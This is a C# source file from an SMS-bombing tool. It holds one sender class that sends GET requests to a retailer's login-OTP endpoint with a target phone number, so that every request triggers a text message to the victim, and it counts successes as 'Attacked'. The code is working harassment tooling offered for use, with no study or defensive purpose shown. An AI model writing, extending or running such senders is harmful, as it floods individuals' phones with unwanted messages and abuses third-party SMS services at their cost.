using System.Net.Http;
using System.Threading.Tasks;

namespace SMS_Bomber.Sender
{
    public class Bigbazaar : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "Bigbazaar";
        private readonly HttpClient Attacker = new HttpClient();

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Get,
                $"https://express.shop.bigbazaar.com/express/customer/{To}/loginOtpInitiate");

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("\"responseCode\":200")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
